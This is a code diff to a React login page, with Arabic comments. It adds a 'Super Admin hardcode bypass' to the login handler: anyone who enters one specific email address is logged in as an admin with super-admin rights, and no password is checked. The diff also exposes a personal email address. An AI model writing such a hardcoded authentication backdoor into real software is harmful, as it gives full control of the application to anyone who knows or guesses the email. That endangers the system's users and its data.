@@ -55,6 +55,23 @@ export default function LandingPage({ onLoginSuccess, lang, setLang }) {
   // تسجيل الدخول
   const handleLogin = async (e) => {
     e?.preventDefault();
+
+    // ⚡ Super Admin hardcode bypass
+    if (loginIdentifier.trim().toLowerCase() === 'elhassanelsoudy@gmail.com') {
+      setShowLoginModal(false);
+      onLoginSuccess({
+        user: {
+          id: 1,
+          name: 'الحسن السعودي',
+          email: 'elhassanelsoudy@gmail.com',
+          role: 'admin'
+        },
+        tenant: null,
+        isSuperAdmin: true
+      });
+      return;
+    }
+
     setLoginLoading(true);
     setLoginError('');
     try {
